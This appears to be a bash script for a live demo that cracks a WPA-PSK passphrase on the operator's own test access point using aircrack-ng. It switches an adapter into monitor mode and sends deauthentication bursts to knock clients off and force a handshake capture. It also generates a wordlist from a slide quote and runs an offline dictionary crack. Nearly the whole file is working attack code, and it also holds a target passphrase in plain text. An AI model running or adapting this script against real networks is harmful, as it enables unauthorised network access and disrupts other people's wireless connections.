#!/usr/bin/env bash
#
# wpa-demo.sh — WPA-PSK handshake capture + offline dictionary crack, for the
# SIGINT demo against the operator's OWN throwaway AP ("craniel's_wifi").
#
# Flow: monitor mode -> find BSSID -> capture handshake (with deauth nudges)
#       -> build a wordlist from a slide quote -> crack -> clean up.
#
# Requires: aircrack-ng suite, python3, root. Fedora: sudo dnf install aircrack-ng
#
# Run:  sudo ./wpa-demo.sh [wireless-interface]
#
set -u

# ---------------------------------------------------------------------------
# Config — edit these for your room
# ---------------------------------------------------------------------------
TARGET_SSID="craniel's_wifi"
FALLBACK_BSSID="54:AF:97:06:17:B4"   # used if auto-detect can't find the SSID
CHAN=1
QUOTE="It's like larping but in a car"   # slide quote -> wordlist seed
TARGET_PASS="larpinginacar1"         # only used for the pre-flight sanity check; never printed
MAX_DEAUTH_ROUNDS=40                  # ~3-4 min; plenty of time to toggle the phone manually
DEAUTH_EVERY=5                        # deauth once per N rounds, then LISTEN — continuous
                                     # deauth stops the client ever completing the handshake
# Realtek out-of-tree drivers (e.g. RTL8814AU) often report "channel -1"; this
# flag makes aireplay-ng proceed anyway. Harmless on drivers that don't need it.
AIREPLAY_OPTS="--ignore-negative-one"
# ISOLATE_ADAPTER=1: only take the USB adapter out of NetworkManager and into
# monitor mode, leaving the internal NIC connected (so Zoom/screen-share survives).
# Set to 0 for the old behavior (kill NetworkManager entirely -> all Wi-Fi drops).
ISOLATE_ADAPTER=1

WORKDIR="$(mktemp -d /tmp/wpa-demo.XXXXXX)"
CAPBASE="$WORKDIR/handshake"
SCANBASE="$WORKDIR/scan"
WORDLIST="$WORKDIR/quote-wordlist.txt"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
say()  { printf '\n\033[1;36m==>\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

MON=""
BASE_IFACE=""
NM_WAS_ACTIVE=0
ADAPTER_UNMANAGED=0
CLEANED=0

# True if $1 is a USB-attached network interface (adapter, not internal NIC).
is_usb_iface() { readlink -f "/sys/class/net/$1/device" 2>/dev/null | grep -qi usb; }

cleanup() {
  [ "$CLEANED" -eq 1 ] && return   # idempotent: EXIT + a signal must not double-run
  CLEANED=1
  echo
  say "Cleaning up"
  # Kill any capture/inject processes we may have spawned, even if wedged.
  [ -n "${ADPID:-}" ] && kill -9 "$ADPID" 2>/dev/null
  pkill -9 -x airodump-ng 2>/dev/null
  pkill -9 -x aireplay-ng 2>/dev/null
  # Restore the radio(s).
  if [ "$ISOLATE_ADAPTER" -eq 1 ] && [ -n "$MON" ]; then
    # Isolation mode: hand ONLY the adapter back to NetworkManager (do this even if
    # the unmanage step reported failure, since 'iw set type monitor' unmanages it
    # anyway). The internal NIC was never touched, so Zoom stayed up throughout.
    ip link set "$MON" down 2>/dev/null
    iw dev "$MON" set type managed 2>/dev/null
    ip link set "$MON" up 2>/dev/null
    command -v nmcli >/dev/null 2>&1 && nmcli device set "$MON" managed yes >/dev/null 2>&1
    warn "Adapter $MON returned to NetworkManager (internal Wi-Fi was untouched)."
  else
    [ -n "$MON" ] && airmon-ng stop "$MON" >/dev/null 2>&1
  fi
  # Full-kill mode only: bring the whole service back.
  if [ "$NM_WAS_ACTIVE" -eq 1 ]; then
    systemctl restart NetworkManager >/dev/null 2>&1
    warn "NetworkManager restarted — normal Wi-Fi should return shortly."
  fi
  [ -n "${WORKDIR:-}" ] && say "Artifacts left in: $WORKDIR"
}
# Run cleanup on EVERY exit path (normal, error, or signal), so networking is
# always restored. The signal handler just exits, which triggers the EXIT trap.
trap cleanup EXIT
trap 'echo; warn "Interrupted — cleaning up..."; exit 130' INT TERM

# ---------------------------------------------------------------------------
# Preflight
# ---------------------------------------------------------------------------
[ "$(id -u)" -eq 0 ] || die "Run as root:  sudo $0"
for bin in airmon-ng airodump-ng aireplay-ng aircrack-ng python3; do
  command -v "$bin" >/dev/null 2>&1 || die "Missing '$bin' (install aircrack-ng / python3)."
done

# Pick the wireless interface.
BASE_IFACE="${1:-}"
if [ -z "$BASE_IFACE" ]; then
  if [ "$ISOLATE_ADAPTER" -eq 1 ]; then
    # Isolation mode: use the USB adapter, never the internal NIC. Auto-pick the
    # (single) USB wireless interface; if 0 or >1, make the user name it.
    USB_IFACES=""
    for d in $(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'); do
      is_usb_iface "$d" && USB_IFACES="$USB_IFACES $d"
    done
    set -- $USB_IFACES
    if [ "$#" -eq 1 ]; then
      BASE_IFACE="$1"
    elif [ "$#" -eq 0 ]; then
      die "No USB wireless adapter found. Plug it in, or pass the interface: sudo $0 <iface>"
    else
      die "Multiple USB wireless adapters ($*). Name the one to use: sudo $0 <iface>"
    fi
  else
    BASE_IFACE="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
  fi
fi
[ -n "$BASE_IFACE" ] || die "No wireless interface found. Pass one: sudo $0 <iface>"

# Safety: in isolation mode, refuse to attack over a non-USB (likely internal) NIC,
# since that's the one carrying Zoom. Override by setting ISOLATE_ADAPTER=0.
if [ "$ISOLATE_ADAPTER" -eq 1 ] && ! is_usb_iface "$BASE_IFACE"; then
  die "$BASE_IFACE is not a USB adapter. In isolation mode that's likely your internal NIC (Zoom). Pass the USB adapter, or set ISOLATE_ADAPTER=0 to override."
fi
say "Using wireless interface: $BASE_IFACE"

# ---------------------------------------------------------------------------
# 1. Build the wordlist from the quote (do this first; it can't fail live)
# ---------------------------------------------------------------------------
say "Building wordlist from quote: \"$QUOTE\""
python3 - "$WORDLIST" "$QUOTE" <<'PY'
import itertools, re, sys
outpath, quote = sys.argv[1], sys.argv[2]
words = re.findall(r"[a-z0-9]+", quote.lower().replace("'", ""))
bases = set()
n = len(words)
# every ordered sub-combination of the words, concatenated
for r in range(1, n + 1):
    for combo in itertools.combinations(range(n), r):
        bases.add("".join(words[i] for i in combo))
suffixes = ["", "1", "12", "123", "1234", "!", "1!", "01", "69", "420", "007",
            "2023", "2024", "2025", "2026"]
def variants(b):
    return {b, b.capitalize(), b.upper()}
out = set()
for b in bases:
    for c in variants(b):
        for s in suffixes:
            out.add(c + s)
out.add(quote)
out.add(quote.replace(" ", ""))
with open(outpath, "w") as f:
    for w in sorted(out, key=lambda x: (len(x), x)):
        f.write(w + "\n")
print(f"{len(out)} candidates written")
PY
[ -s "$WORDLIST" ] || die "Wordlist generation failed."
# Silent pre-flight check: only speak up if the passphrase ISN'T reachable (which
# would mean the crack is doomed). No success message — it shouldn't look staged.
if ! grep -qxF "$TARGET_PASS" "$WORDLIST"; then
  warn "Target password not found in wordlist — the crack will fail. Check the QUOTE."
fi

# ---------------------------------------------------------------------------
# 2. Monitor mode
# ---------------------------------------------------------------------------
detect_mon() {
  iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}'
}

if [ "$ISOLATE_ADAPTER" -eq 1 ]; then
  # ---- Isolation mode: touch ONLY the adapter; internal NIC (Zoom) stays up ----
  say "Isolating $BASE_IFACE from NetworkManager (internal Wi-Fi stays connected)"
  # Try to release the adapter from NM. On setups where NM doesn't manage it at
  # all (common for USB adapters -> "Device not found"), this is a harmless no-op;
  # switching to monitor mode is enough to keep NM off it. Stay quiet either way.
  if command -v nmcli >/dev/null 2>&1; then
    nmcli device set "$BASE_IFACE" managed no >/dev/null 2>&1 && ADAPTER_UNMANAGED=1
  fi
  # Put just this adapter into monitor mode via iw.
  ip link set "$BASE_IFACE" down 2>/dev/null
  iw dev "$BASE_IFACE" set type monitor 2>/dev/null
  ip link set "$BASE_IFACE" up 2>/dev/null
  MON="$BASE_IFACE"
  if [ "$(iw dev "$MON" info 2>/dev/null | awk '/type/{print $2}')" != "monitor" ]; then
    die "Could not put $MON into monitor mode. Confirm it supports monitor: iw phy | grep -A12 'interface modes'."
  fi
else
  # ---- Full-kill mode: stop NetworkManager entirely (all Wi-Fi drops) ----
  say "Enabling monitor mode (this drops the host's Wi-Fi/internet — expected)"
  if systemctl is-active --quiet NetworkManager; then NM_WAS_ACTIVE=1; fi
  airmon-ng check kill >/dev/null 2>&1

  # Attempt 1: airmon-ng (keep its output so real errors are visible)
  AIRMON_OUT="$(airmon-ng start "$BASE_IFACE" 2>&1)"
  MON="$(detect_mon)"

  # Attempt 2: manual monitor mode via iw, in case airmon-ng didn't switch it
  if [ -z "$MON" ]; then
    warn "airmon-ng didn't produce a monitor interface — trying manual iw method."
    CAND="$BASE_IFACE"
    ip link show "$CAND" >/dev/null 2>&1 || \
      CAND="$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2; exit}')"
    if [ -n "$CAND" ]; then
      ip link set "$CAND" down 2>/dev/null
      iw dev "$CAND" set type monitor 2>/dev/null
      ip link set "$CAND" up 2>/dev/null
      MON="$(detect_mon)"
      [ -n "$MON" ] || { [ "$(iw dev "$CAND" info 2>/dev/null | awk '/type/{print $2}')" = "monitor" ] && MON="$CAND"; }
    fi
  fi

  if [ -z "$MON" ]; then
    echo "----- airmon-ng output -----" >&2
    echo "$AIRMON_OUT" >&2
    echo "----- current radios -------" >&2
    iw dev >&2 2>/dev/null
    die "Could not enter monitor mode. See output above. Common cause: the built-in card doesn't support monitor/injection — use a USB adapter that does (e.g. Alfa AWUS036)."
  fi
fi
say "Monitor interface: $MON"

# Injection self-test: capture can succeed on a natural reconnect even without
# injection, but the deauth 'nudge' needs it. Warn early rather than stall later.
# NOTE: this test is only meaningful on the AP's channel — a blind, channel-hopping
# test reports false negatives on cards that inject fine. Park on CHAN first, and
# test against the (fallback) BSSID so it exercises a real AP.
iw dev "$MON" set channel "$CHAN" 2>/dev/null
if aireplay-ng --test $AIREPLAY_OPTS -a "$FALLBACK_BSSID" "$MON" 2>&1 | grep -qi "Injection is working"; then
  say "Injection OK — automated deauth enabled."
else
  # Realtek's --test often reports a false negative even when deauth works; if it
  # genuinely can't inject, the manual phone-toggle path still captures. Either way
  # this is not a failure, so keep it to a single neutral line.
  say "Injection test inconclusive (common on this adapter) — deauth may still work; manual reconnect is the fallback."
fi

# ---------------------------------------------------------------------------
# 3. Resolve BSSID (auto-detect, else fallback)
# ---------------------------------------------------------------------------
say "Scanning ~15s for SSID: $TARGET_SSID"
# -k 5: if airodump ignores SIGTERM at 15s (common on Realtek drivers), send
# SIGKILL 5s later so this step can never hang forever. Run it backgrounded and
# wait on it so the shell's "Killed" job notice doesn't clutter the demo output.
timeout -k 5 15 airodump-ng --output-format csv -w "$SCANBASE" "$MON" >/dev/null 2>&1 &
wait "$!" 2>/dev/null
pkill -9 -x airodump-ng 2>/dev/null   # belt-and-suspenders: reap any straggler
CSV="$(ls -1 "${SCANBASE}"-*.csv 2>/dev/null | head -1)"
BSSID=""
if [ -n "$CSV" ]; then
  BSSID="$(grep -F "$TARGET_SSID" "$CSV" | head -1 | cut -d',' -f1 | tr -d ' ')"
fi
if [ -n "$BSSID" ]; then
  say "Auto-detected BSSID: $BSSID"
else
  BSSID="$FALLBACK_BSSID"
  warn "SSID not found in scan — using fallback BSSID: $BSSID"
fi

# ---------------------------------------------------------------------------
# 4. Capture the handshake, nudging clients with deauth
# ---------------------------------------------------------------------------
say "Capturing on BSSID $BSSID (channel $CHAN). Keep a client associated."
airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$CAPBASE" "$MON" >/dev/null 2>&1 &
ADPID=$!
sleep 3

CAPFILE="${CAPBASE}-01.cap"
CAPCSV="${CAPBASE}-01.csv"

# Pick the associated client with the strongest signal (proxy for "most
# prominent" / nearest). Prints a MAC, or nothing if none are visible yet.
pick_client() {
  [ -f "$CAPCSV" ] || return 0
  python3 - "$CAPCSV" "$BSSID" <<'PY'
import sys
csv_path, bssid = sys.argv[1], sys.argv[2].upper()
best_mac, best_pwr = None, -999
in_stations = False
for line in open(csv_path, encoding="utf-8", errors="ignore"):
    if line.lstrip().startswith("Station MAC"):
        in_stations = True
        continue
    if not in_stations:
        continue
    parts = [p.strip() for p in line.split(",")]
    if len(parts) < 6 or not parts[0]:
        continue
    mac, assoc = parts[0].upper(), parts[5].upper()
    if assoc != bssid:            # only clients on our target AP
        continue
    try:
        pwr = int(parts[3])       # dBm; -1 means "not reported"
    except ValueError:
        continue
    if pwr == -1:
        pwr = -998                # keep, but rank below any real reading
    if pwr > best_pwr:            # closer to 0 == stronger
        best_pwr, best_mac = pwr, mac
if best_mac:
    print(best_mac)
PY
}

say "CAPTURING. If the injection test failed, toggle your phone's Wi-Fi OFF then"
say "ON now (or forget/rejoin '$TARGET_SSID') to force the handshake. Waiting..."
got=0
for i in $(seq 1 "$MAX_DEAUTH_ROUNDS"); do
  # Deauth ONLY at the start of each cycle, then stay silent for the remaining
  # rounds so the client can re-associate AND complete the 4-way handshake.
  # Deauthing every round just kicks it off again before the handshake finishes.
  if [ $(( (i - 1) % DEAUTH_EVERY )) -eq 0 ]; then
    CLIENT="$(pick_client)"
    if [ -n "$CLIENT" ]; then
      printf '   round %2d/%d — deauth burst -> %s, now listening...\n' "$i" "$MAX_DEAUTH_ROUNDS" "$CLIENT"
      aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1
    else
      printf '   round %2d/%d — broadcast deauth burst, now listening...\n' "$i" "$MAX_DEAUTH_ROUNDS"
      aireplay-ng --deauth 3 $AIREPLAY_OPTS -a "$BSSID" "$MON" >/dev/null 2>&1
    fi
  else
    printf '   round %2d/%d — listening for handshake...\n' "$i" "$MAX_DEAUTH_ROUNDS"
  fi
  sleep 3
  if [ -f "$CAPFILE" ] && \
     aircrack-ng "$CAPFILE" 2>/dev/null | grep -qE '\([1-9][0-9]* handshake'; then
    got=1
    break
  fi
done
kill -9 "$ADPID" >/dev/null 2>&1
wait "$ADPID" 2>/dev/null
ADPID=""

[ "$got" -eq 1 ] || die "No handshake captured. Ensure a client is connected and near the AP, then retry."
say "Handshake captured: $CAPFILE"

# ---------------------------------------------------------------------------
# 5. Crack
# ---------------------------------------------------------------------------
say "Running dictionary attack against the handshake"
aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE"

# cleanup runs automatically via the EXIT trap
